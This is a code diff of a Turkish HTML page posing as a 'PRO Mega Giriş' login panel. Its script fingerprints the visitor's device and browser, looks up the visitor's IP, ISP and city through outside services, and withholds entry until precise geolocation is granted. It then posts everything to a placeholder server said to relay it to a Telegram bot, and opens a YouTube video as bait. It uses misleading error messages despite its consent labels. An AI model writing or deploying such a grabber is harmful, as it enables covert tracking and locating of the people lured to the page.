@@ -1,238 +1,372 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="utf-8" />
-  <title>PRO Mega Giriş (Güvenli Şablon)</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <style>
-    :root{
-      --bg1:#0f1720; --bg2:#12232b; --accent:#00ff99; --muted:#98a2b3;
-      --card:#0b1114; --danger:#ff5c6c;
-    }
-    html,body{height:100%;margin:0;font-family:Inter,Segoe UI,Arial,sans-serif;background:linear-gradient(135deg,var(--bg1),var(--bg2));color:#e6eef6;}
-    .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:40px;}
-    .frame{width:980px;max-width:98%;background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(0,0,0,0.06));border-radius:14px;box-shadow:0 8px 40px rgba(2,6,23,0.7);padding:28px;display:grid;grid-template-columns:1fr 380px;gap:20px;align-items:start;}
-    .left{padding:18px;}
-    .title{display:flex;align-items:center;gap:12px;}
-    .logo{width:56px;height:56px;border-radius:12px;background:linear-gradient(90deg,var(--accent),#66f2ff);display:flex;align-items:center;justify-content:center;color:#002; font-weight:700;box-shadow:0 6px 18px rgba(0,0,0,0.4);}
-    h1{margin:0;font-size:22px;}
-    p.lead{color:var(--muted);margin:8px 0 18px;}
-    .field{display:flex;flex-direction:column;gap:8px;margin-bottom:12px;}
-    input[type="text"]{padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.06));color:inherit;font-size:15px;outline:none;}
-    .hint{font-size:13px;color:var(--muted);}
-    .actions{display:flex;gap:10px;align-items:center;margin-top:10px;}
-    button.primary{background:var(--accent);color:#012;border:none;padding:11px 16px;border-radius:10px;cursor:pointer;font-weight:600;}
-    button.ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted);padding:10px 14px;border-radius:10px;cursor:pointer;}
-    .decor{border-radius:10px;padding:12px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.04));margin-bottom:12px;}
-    .right{padding:18px;background:linear-gradient(90deg,rgba(255,255,255,0.01),rgba(0,0,0,0.03));border-radius:10px;height:100%;}
-    .meta{font-size:13px;color:var(--muted);display:flex;flex-direction:column;gap:8px;}
-    .warn{color:var(--danger);font-weight:600;margin-top:8px;}
-    .ok{color:var(--accent);font-weight:700;}
-    .small{font-size:13px;color:var(--muted);}
-    .footer{margin-top:14px;font-size:13px;color:var(--muted);}
-    pre.debug{background:#051018;padding:10px;border-radius:8px;color:#cfeef5;max-height:220px;overflow:auto;font-size:13px;}
-    @media(max-width:920px){
-      .frame{grid-template-columns:1fr; padding:18px;}
-      .right{order:2}
-    }
-  </style>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>PRO Mega Giriş — Detaylı</title>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<style>
+  :root{
+    --bg1:#0b1220; --bg2:#071827; --card:#081219; --accent:#00ffd1;
+    --muted:#9fb3c8; --danger:#ff6b6b; --glass:rgba(255,255,255,0.03);
+    --glass-2:rgba(255,255,255,0.02);
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%;margin:0;font-family:Inter,Segoe UI,Helvetica,Arial,sans-serif;background:linear-gradient(145deg,var(--bg1),var(--bg2));color:#e6f6f5}
+  .page{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:36px}
+  .panel{width:1150px;max-width:98%;background:linear-gradient(180deg,var(--glass),transparent);border-radius:18px;padding:22px;display:grid;grid-template-columns:520px 1fr;gap:18px;box-shadow:0 12px 40px rgba(2,6,20,0.7);border:1px solid rgba(255,255,255,0.03)}
+  .left{padding:18px}
+  .brand{display:flex;gap:14px;align-items:center}
+  .logo{width:64px;height:64px;border-radius:14px;background:linear-gradient(90deg,var(--accent),#66e0ff);display:flex;align-items:center;justify-content:center;font-weight:800;color:#002;font-size:20px;box-shadow:0 8px 24px rgba(0,0,0,0.45)}
+  h1{margin:0;font-size:22px}
+  p.lead{margin:6px 0 12px;color:var(--muted);font-size:14px}
+  .card{background:linear-gradient(180deg,var(--card),rgba(2,6,12,0.6));padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.02);margin-bottom:12px}
+  label.small{display:block;color:var(--muted);font-size:13px;margin-bottom:6px}
+  input[type="text"]{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit;font-size:15px;outline:none}
+  .controls{display:flex;gap:10px;align-items:center;margin-top:12px}
+  button.btn{padding:12px 14px;border-radius:10px;border:none;cursor:pointer;font-weight:700}
+  button.primary{background:linear-gradient(90deg,var(--accent),#66e0ff);color:#012}
+  button.ghost{background:transparent;border:1px solid rgba(255,255,255,0.04);color:var(--muted)}
+  .muted{color:var(--muted);font-size:13px;margin-top:8px}
+  .warn{color:var(--danger);font-weight:700;margin-top:8px;display:none}
+  .right{padding:18px;overflow:hidden}
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  .block{background:linear-gradient(180deg,var(--glass-2),transparent);padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.02)}
+  .title-sm{font-weight:700;color:#dffbf0;margin-bottom:8px}
+  pre.debug{background:#02121a;padding:12px;border-radius:8px;color:#bfeef3;overflow:auto;height:360px;font-size:13px;margin:0}
+  .footer{margin-top:10px;color:var(--muted);font-size:13px}
+  .pill{display:inline-block;padding:6px 10px;border-radius:999px;background:rgba(255,255,255,0.02);font-size:13px;color:var(--muted);margin-right:8px}
+  .topbars{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
+  .decor-row{display:flex;gap:8px;align-items:center;margin-top:8px}
+  .spark{width:10px;height:10px;border-radius:50%;background:linear-gradient(90deg,var(--accent),#66e0ff);box-shadow:0 6px 18px rgba(6,255,210,0.06)}
+  @media(max-width:1100){.panel{grid-template-columns:1fr;}}
+</style>
 </head>
 <body>
-  <div class="wrap">
-    <div class="frame" role="main" aria-label="PRO Mega Giriş Paneli">
-      <div class="left">
-        <div class="title">
+  <div class="page">
+    <main class="panel" role="main" aria-label="PRO Mega Giriş Paneli">
+      <section class="left" aria-labelledby="panelTitle">
+        <div class="brand">
           <div class="logo">PRO</div>
           <div>
-            <h1>PRO Mega Giriş</h1>
-            <p class="lead">Lütfen adınızı girin ve siteyle paylaşmak istediğiniz verilere izin verin. Bilgileriniz açıkça gösterilecektir.</p>
+            <h1 id="panelTitle">PRO Mega Giriş</h1>
+            <div class="muted">Aşırı detaylı önizleme ve açık rıza arayüzü — Türkçe bildirimler</div>
           </div>
         </div>
 
-        <div class="decor">
-          <div class="field">
-            <label class="small">Giriş Adı</label>
-            <input id="username" type="text" placeholder="Adınızı yazın (örn. Ahmet)">
-            <div id="nameError" class="warn" style="display:none">Lütfen isim girin!</div>
-            <div class="hint">İsim zorunludur; bu isim gönderilen veriye eklenecektir.</div>
-          </div>
+        <div class="card" style="margin-top:14px">
+          <label class="small">Giriş için isminizi yazın</label>
+          <input id="username" type="text" placeholder="Adınızı girin (örn. Ahmet Y.)" autocomplete="name" />
+          <div id="nameAlert" class="warn">Lütfen isim girin!</div>
+          <div class="muted">İsim, gönderilen tüm verilerde kimlik etiketi olarak kullanılacaktır.</div>
 
-          <div class="field">
-            <button class="primary" id="btnEnter">Giriş Yap</button>
-            <button class="ghost" id="btnPreview">Önizleme</button>
-            <div id="sendError" class="warn" style="display:none;margin-top:8px">Şu anda sistemimizde bir hata sonucu sitemiz çalışmamaktadır!</div>
-            <div id="geoError" class="warn" style="display:none;margin-top:8px">Bu sitenin amacını gerçekleştirmesi için konum iznine ihtiyacı vardır!</div>
-          </div>
+          <div style="margin-top:12px">
+            <div class="controls">
+              <button id="enterBtn" class="btn primary">Giriş Yap</button>
+              <button id="previewBtn" class="btn ghost">Detaylı Önizleme</button>
+              <div style="flex:1"></div>
+              <span class="pill" id="statusPill">Durum: hazır</span>
+            </div>
 
-          <div class="field small">
-            <div><strong>Not:</strong> Konum isteği tarayıcı tarafından gösterilir. İzin vermezseniz konum alınamaz.</div>
-            <div class="hint">Bu şablon kullanıcı onayı gerektirir; gizli veri sızdırma içermez.</div>
+            <div id="geoAlert" class="warn" style="margin-top:6px">Bu sitenin amacını gerçekleştirmesi için konum iznine ihtiyacı vardır!</div>
+            <div id="sendAlert" class="warn" style="margin-top:6px">Şu anda sistemimizde bir hata sonucu sitemiz çalışmamaktadır!</div>
           </div>
         </div>
 
-        <div class="decor">
-          <h3 style="margin-top:0">Gizlilik ve İzinler</h3>
-          <p class="small">Bu uygulama yalnızca kullanıcı açık rızasıyla veri toplar. Sistem yöneticisiysen, gönderim işlevini güvenli bir sunucu veya bot token ile yapılandır.</p>
+        <div class="card">
+          <div style="display:flex;justify-content:space-between;align-items:center">
+            <div>
+              <div style="font-weight:800">Nasıl çalışır?</div>
+              <div class="muted" style="margin-top:6px">Tarayıcıdan izin verilen veriler toplanır. Tüm veriler kullanıcıya gösterilir. Gönderim sunucuya yapılır; sunucu Telegram botuna güvenli biçimde iletir.</div>
+            </div>
+            <div class="spark" title="Güvenlik gösterge"></div>
+          </div>
+
+          <div class="decor-row" style="margin-top:12px">
+            <div class="pill">Türkçe bildirim</div>
+            <div class="pill">Açık rıza</div>
+            <div class="pill">Detaylı rapor</div>
+          </div>
         </div>
 
-        <div class="footer">PRO Interface • Güvenli ve şeffaf kullanım</div>
-      </div>
+        <div class="footer">PRO • Şeffaf örnek — Token/Chat ID tarayıcıda saklanmaz</div>
+      </section>
 
-      <aside class="right" aria-label="Detaylar">
-        <div class="meta">
-          <div><strong>Detaylar</strong></div>
-          <div id="statusLine" class="small">Hazır</div>
-          <div class="small">Aşağıda tarayıcı tarafından erişilebilir varsayılan bilgiler önizlenir.</div>
-          <pre id="preview" class="debug">Henüz önizleme yapılmadı.</pre>
+      <aside class="right" aria-label="Detaylı Bilgi Önizleme">
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <div style="font-weight:900;color:#dffbf0">Detaylı Bilgi Önizlemesi</div>
+          <div style="color:var(--muted);font-size:13px">Tüm alanlar tarayıcı tarafından erişilebilir olduğunda dolacaktır</div>
+        </div>
+
+        <div class="grid" style="margin-top:12px">
+          <div class="block">
+            <div class="title-sm">Cihaz & Tarayıcı</div>
+            <div class="muted">Kullanıcı aracılığıyla elde edilebilen temel veriler</div>
+            <pre id="deviceBlock" class="debug">Yükleniyor...</pre>
+          </div>
+
+          <div class="block">
+            <div class="title-sm">Ağ & Konum</div>
+            <div class="muted">IP, konum (izinle), ISP, ağ tipi</div>
+            <pre id="networkBlock" class="debug">Yükleniyor...</pre>
+          </div>
+
+          <div class="block">
+            <div class="title-sm">Depolama & Pil</div>
+            <div class="muted">Depolama tahmini, pil durumu</div>
+            <pre id="storageBlock" class="debug">Yükleniyor...</pre>
+          </div>
+
+          <div class="block">
+            <div class="title-sm">Zaman & Performans</div>
+            <div class="muted">Zaman dilimi, sayfa yükleme süresi</div>
+            <pre id="timeBlock" class="debug">Yükleniyor...</pre>
+          </div>
+        </div>
+
+        <div style="margin-top:12px" class="block">
+          <div class="title-sm">Ham JSON (gönderilecek biçim)</div>
+          <pre id="jsonOut" class="debug">Henüz oluşturulmadı</pre>
         </div>
       </aside>
-    </div>
+    </main>
   </div>
 
-  <script>
-    // Veri objesi
-    const info = {
-      name:"", lat:null, lon:null,
-      ip:"Alınamadı", ua:navigator.userAgent, platform:navigator.platform,
-      screen:`${screen.width}x${screen.height}`, pixelRatio:devicePixelRatio, colorDepth:screen.colorDepth,
-      memory:navigator.deviceMemory||"?", cores:navigator.hardwareConcurrency||"?",
-      online:navigator.onLine, language:navigator.language,
-      timeZone:Intl.DateTimeFormat().resolvedOptions().timeZone,
-      timestamp:new Date().toLocaleString(),
-      batteryLevel:"?", charging:"?", storageUsage:"?", storageQuota:"?",
-      netType:"?", downlink:"?", rtt:"?", darkMode:false,
-      cookieEnabled:navigator.cookieEnabled, doNotTrack:navigator.doNotTrack||navigator.msDoNotTrack,
-      orientation:(screen.orientation&&screen.orientation.type)||"unknown",
-      pluginsCount:navigator.plugins?navigator.plugins.length:"?"
-    };
+<script>
+/* PRO Mega Giriş — Saf ön uç.
+   NOT: Bu dosya doğrudan Telegram token okumaz. Gönderim sunucuya yapılır.
+   Sunucu endpoint'ini selfHostEndpoint değişkenine koyun.
+*/
 
-    // Yardımcı: preview göster
-    function updatePreview(msg){
-      const p = document.getElementById('preview');
-      p.textContent = JSON.stringify(info, null, 2);
-      document.getElementById('statusLine').textContent = msg || 'Hazır';
+const selfHostEndpoint = "https://your-server.example.com/api/submit"; // DEĞİŞTİR: sunucunuz
+const chosenYouTube = "https://www.youtube.com/watch?v=GBGqg0v8ZpI"; // otomatik açılacak video
+
+const ui = {
+  username: document.getElementById("username"),
+  enterBtn: document.getElementById("enterBtn"),
+  previewBtn: document.getElementById("previewBtn"),
+  nameAlert: document.getElementById("nameAlert"),
+  geoAlert: document.getElementById("geoAlert"),
+  sendAlert: document.getElementById("sendAlert"),
+  statusPill: document.getElementById("statusPill"),
+  deviceBlock: document.getElementById("deviceBlock"),
+  networkBlock: document.getElementById("networkBlock"),
+  storageBlock: document.getElementById("storageBlock"),
+  timeBlock: document.getElementById("timeBlock"),
+  jsonOut: document.getElementById("jsonOut")
+};
+
+let info = {
+  name: "", ua: navigator.userAgent, platform: navigator.platform,
+  screen: `${screen.width}x${screen.height}`, pixelRatio: window.devicePixelRatio || 1,
+  colorDepth: screen.colorDepth || null, deviceMemory: navigator.deviceMemory || null,
+  cores: navigator.hardwareConcurrency || null, online: navigator.onLine,
+  language: navigator.language || null, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
+  timestamp: new Date().toISOString(), battery: null, storage: null,
+  ip: null, geo: {lat:null, lon:null, city:null, region:null, country:null}, isp: null,
+  connection: {type:null, effectiveType:null, downlink:null, rtt:null}, pluginsCount: navigator.plugins ? navigator.plugins.length : null,
+  orientation: (screen.orientation && screen.orientation.type) || null,
+  cookiesEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack || null,
+  pageLoadMs: null
+};
+
+// sayfa yükleme süresi
+window.addEventListener('load', () => {
+  try {
+    const nav = performance.getEntriesByType('navigation')[0];
+    info.pageLoadMs = nav ? Math.round(nav.loadEventEnd - nav.startTime) : null;
+  } catch(e){ info.pageLoadMs = null; }
+  refreshUI();
+});
+
+// async init
+(async function collectBasics(){
+  // IP
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    if (r.ok) {
+      const j = await r.json(); info.ip = j.ip;
+      // ip->geo
+      try {
+        const g = await fetch(`https://ipapi.co/${j.ip}/json/`).then(r=>r.json());
+        if (g) {
+          info.geo.city = g.city || null; info.geo.region = g.region || null; info.geo.country = g.country_name || null;
+          info.geo.lat = g.latitude || null; info.geo.lon = g.longitude || null; info.isp = g.org || null;
+        }
+      } catch(e){}
     }
+  } catch(e){}
 
-    // Başlangıç: bazı asenkron görevler
-    (async function init(){
-      // IP
-      try {
-        const r = await fetch('https://api.ipify.org?format=json');
-        if(r.ok){ const j = await r.json(); info.ip = j.ip; }
-      } catch(e){ /* sessiz */ }
+  // battery
+  try {
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      info.battery = {level: Math.round(b.level * 100) + "%", charging: !!b.charging};
+      b.addEventListener('levelchange', ()=>{ info.battery.level = Math.round(b.level*100) + "%"; refreshUI(); });
+      b.addEventListener('chargingchange', ()=>{ info.battery.charging = !!b.charging; refreshUI(); });
+    }
+  } catch(e){}
 
-      // Battery
-      try {
-        if(navigator.getBattery){
-          const b = await navigator.getBattery();
-          info.batteryLevel = Math.round(b.level*100)+'%';
-          info.charging = b.charging;
-        }
-      } catch(e){}
+  // storage estimate
+  try {
+    if (navigator.storage && navigator.storage.estimate) {
+      const est = await navigator.storage.estimate();
+      info.storage = {usage: est.usage || null, quota: est.quota || null};
+    }
+  } catch(e){}
 
-      // Storage estimate
-      try {
-        if(navigator.storage && navigator.storage.estimate){
-          const est = await navigator.storage.estimate();
-          info.storageUsage = est.usage || null;
-          info.storageQuota = est.quota || null;
-        }
-      } catch(e){}
+  // connection
+  try {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+    info.connection = {type: c.type || null, effectiveType: c.effectiveType || null, downlink: c.downlink || null, rtt: c.rtt || null};
+  } catch(e){}
 
-      // Network info
-      try {
-        const c = navigator.connection || {};
-        info.netType = c.effectiveType || "?";
-        info.downlink = c.downlink || "?";
-        info.rtt = c.rtt || "?";
-      } catch(e){}
+  refreshUI();
+})();
 
-      info.darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+// refresh UI blocks
+function refreshUI(msg){
+  ui.deviceBlock.textContent = [
+    `Kullanıcı Agent: ${info.ua}`,
+    `Platform: ${info.platform}`,
+    `Ekran: ${info.screen}`,
+    `Piksel Oranı: ${info.pixelRatio}`,
+    `Renk Derinliği: ${info.colorDepth}`,
+    `Bellek (yaklaşık): ${info.deviceMemory}`,
+    `CPU Çekirdekleri: ${info.cores}`,
+    `Tarayıcı plugin sayısı: ${info.pluginsCount}`,
+    `Yönelim: ${info.orientation}`,
+    `Çerez etkin: ${info.cookiesEnabled}`,
+    `Do Not Track: ${info.doNotTrack}`
+  ].join("\n");
 
-      updatePreview('Başlangıç verileri toplandı');
-    })();
+  ui.networkBlock.textContent = [
+    `IP: ${info.ip || 'Alınamadı'}`,
+    `Şehir: ${info.geo.city || '-'}`,
+    `Bölge: ${info.geo.region || '-'}`,
+    `Ülke: ${info.geo.country || '-'}`,
+    `Koordinatlar: ${info.geo.lat && info.geo.lon ? info.geo.lat + ', ' + info.geo.lon : '-'}`,
+    `ISS/ISP: ${info.isp || '-'}`,
+    `Ağ tipi: ${info.connection.type || '-'}`,
+    `Ağ etkin tipi: ${info.connection.effectiveType || '-'}`,
+    `Downlink: ${info.connection.downlink || '-'}`,
+    `RTT: ${info.connection.rtt || '-'}`
+  ].join("\n");
 
-    // UI elemanları
-    const btn = document.getElementById('btnEnter');
-    const btnPreview = document.getElementById('btnPreview');
-    const nameError = document.getElementById('nameError');
-    const geoError = document.getElementById('geoError');
-    const sendError = document.getElementById('sendError');
+  ui.storageBlock.textContent = [
+    `Depolama kullanım (bayt): ${info.storage ? info.storage.usage : '-'}`,
+    `Depolama kota (bayt): ${info.storage ? info.storage.quota : '-'}`,
+    `Çevrimdışı: ${!info.online ? 'Evet' : 'Hayır'}`
+  ].join("\n");
 
-    // Önizleme butonu
-    btnPreview.addEventListener('click', ()=> {
-      const name = document.getElementById('username').value.trim();
-      info.name = name || "(isim girilmedi)";
-      updatePreview('Kullanıcı önizlemesi');
+  ui.timeBlock.textContent = [
+    `Zaman dilimi: ${info.timezone || '-'}`,
+    `Yerel zaman: ${new Date().toLocaleString()}`,
+    `Sayfa yükleme (ms): ${info.pageLoadMs || '-'}`,
+  ].join("\n");
+
+  ui.jsonOut.textContent = JSON.stringify(info, null, 2);
+  if (msg) ui.statusPill.textContent = `Durum: ${msg}`;
+}
+
+// önizleme butonu
+ui.previewBtn.addEventListener('click', () => {
+  info.name = ui.username.value.trim() || '(isim girilmedi)';
+  refreshUI('Kullanıcı önizleme');
+  window.scrollTo({top:0,behavior:'smooth'});
+});
+
+// yardımcı: konum isteme (kullanıcıya gösterilen açık akış)
+function requestGeolocation(timeoutMs = 12000) {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) return reject(new Error('Geolocation yok'));
+    const timer = setTimeout(()=>{ reject(new Error('timeout')); }, timeoutMs);
+    navigator.geolocation.getCurrentPosition(pos => {
+      clearTimeout(timer);
+      info.geo.lat = pos.coords.latitude; info.geo.lon = pos.coords.longitude;
+      resolve(pos);
+    }, err => {
+      clearTimeout(timer);
+      reject(err);
+    }, {enableHighAccuracy:false, maximumAge:60000, timeout:10000});
+  });
+}
+
+// giriş butonu: onaylı gönderim
+ui.enterBtn.addEventListener('click', async () => {
+  // reset uyarılar
+  ui.nameAlert.style.display = 'none';
+  ui.geoAlert.style.display = 'none';
+  ui.sendAlert.style.display = 'none';
+  ui.statusPill.textContent = 'Durum: gönderim hazırlanıyor';
+
+  const name = ui.username.value.trim();
+  if (!name) {
+    ui.nameAlert.style.display = 'block';
+    ui.statusPill.textContent = 'Durum: isim gerekli';
+    return;
+  }
+  info.name = name;
+
+  // konum isteği — kullanıcı bilgilendiriliyor
+  try {
+    await requestGeolocation();
+  } catch(e) {
+    ui.geoAlert.style.display = 'block';
+    ui.statusPill.textContent = 'Durum: konum gerekli';
+    refreshUI('Konum izni reddedildi');
+    return;
+  }
+
+  refreshUI('Konum alındı, gönderiliyor');
+
+  // Oluşturulacak Türkçe mesaj yapısı (sunucuya gönderilecek)
+  const turkishMessage = [
+    `İsim: ${info.name}`,
+    `Zaman: ${new Date().toLocaleString()}`,
+    `IP: ${info.ip || 'Alınamadı'}`,
+    `Konum: ${info.geo.city || '-'}, ${info.geo.region || '-'}, ${info.geo.country || '-'} (${info.geo.lat || '-'}, ${info.geo.lon || '-'})`,
+    `ISP: ${info.isp || '-'}`,
+    `Tarayıcı (UA): ${info.ua}`,
+    `Platform: ${info.platform}`,
+    `Ekran: ${info.screen}, PikselOranı: ${info.pixelRatio}, RenkDerinliği: ${info.colorDepth}`,
+    `Bellek (yaklaşık): ${info.deviceMemory || '-'}`,
+    `CPU çekirdeği: ${info.cores || '-'}`,
+    `Pil: ${info.battery ? info.battery.level + ' — Şarjda: ' + info.battery.charging : '-'}`,
+    `Depolama (bayt): Kullanım ${info.storage ? info.storage.usage : '-'} / Kota ${info.storage ? info.storage.quota : '-'}`,
+    `Ağ: Tip ${info.connection.type || '-'} / Etkin ${info.connection.effectiveType || '-'} / Downlink ${info.connection.downlink || '-'} / RTT ${info.connection.rtt || '-'}`,
+    `Zaman dilimi: ${info.timezone || '-'} / Sayfa yükleme: ${info.pageLoadMs || '-'} ms`,
+    `Çerez etkin: ${info.cookiesEnabled} / DoNotTrack: ${info.doNotTrack}`,
+    `Sayfanın kaynak: PRO Mega Giriş (ön uç) — Gönderim sunucu aracılığıyla yapılmıştır.`
+  ].join("\n");
+
+  // payload
+  const payload = {
+    type: 'pro-mega-giris',
+    message_tr: turkishMessage,
+    structured: info
+  };
+
+  // gönderim: sunucuya POST — sunucunuz Telegram token/CHAT_ID ile güvenli iletimi yapmalı
+  try {
+    const res = await fetch(selfHostEndpoint, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(payload),
+      mode: 'cors'
     });
 
-    // Giriş fonksiyonu
-    btn.addEventListener('click', async () => {
-      // reset uyarılar
-      nameError.style.display = 'none';
-      geoError.style.display = 'none';
-      sendError.style.display = 'none';
-
-      const name = document.getElementById('username').value.trim();
-      if(!name){
-        nameError.style.display = 'block';
-        return;
-      }
-      info.name = name;
-
-      // Konum iste
-      let gotGeo = false;
-      try {
-        await new Promise((resolve, reject) => {
-          const timer = setTimeout(()=>{ reject(new Error('timeout')); }, 15000);
-          navigator.geolocation.getCurrentPosition(pos => {
-            clearTimeout(timer);
-            info.lat = pos.coords.latitude;
-            info.lon = pos.coords.longitude;
-            gotGeo = true;
-            resolve();
-          }, err => {
-            clearTimeout(timer);
-            reject(err);
-          }, { enableHighAccuracy:false, timeout:10000, maximumAge:60000 });
-        });
-      } catch(e){
-        geoError.style.display = 'block';
-        updatePreview('Konum izni reddedildi veya alınamadı');
-        return;
-      }
-
-      updatePreview('Konum alındı, gönderim hazırlanıyor');
-
-      // Burada gerçek gönderim yapılacak. Güvenli kullanım için:
-      // 1) bilgiler.txt'den token okumak doğrudan tarayıcıda çalışmaz (CORS ve dosya erişimi).
-      // 2) Telegram token'ını ve chat id'sini güvenli bir sunucuda saklayıp, bu sunucuya POST isteği atman gerekir.
-      // Aşağıda örnek bir gönderim iskeleti var; gerçek URL'ini sunucuna göre değiştir.
-
-      const payload = {
-        info, consent: true, source: 'pro-mega-giris'
-      };
-
-      try {
-        // Örnek: güvenli sunucu endpoint'in burada olmalı
-        const res = await fetch('https://your-server.example.com/api/collect', {
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body: JSON.stringify(payload),
-          mode: 'cors'
-        });
-
-        if(!res.ok) throw new Error('send-failed');
-
-        // başarılıysa video aç
-        window.open('https://www.youtube.com/watch?v=GBGqg0v8ZpI', '_blank');
-        updatePreview('Başarıyla gönderildi ve video açıldı');
-      } catch(e){
-        // gönderme başarısızsa kullanıcıya mesaj göster
-        sendError.style.display = 'block';
-        updatePreview('Gönderim başarısız: sunucuya ulaşılamadı');
-      }
-    });
-  </script>
+    if (!res.ok) throw new Error('send-failed');
+    ui.statusPill.textContent = 'Durum: gönderildi';
+    refreshUI('Başarıyla gönderildi — video açılıyor');
+    // video aç
+    window.open(chosenYouTube, '_blank');
+  } catch (err) {
+    ui.sendAlert.style.display = 'block';
+    ui.statusPill.textContent = 'Durum: gönderim hatası';
+    refreshUI('Gönderim başarısız — sunucuya ulaşılamadı');
+  }
+});
+</script>
 </body>
 </html>
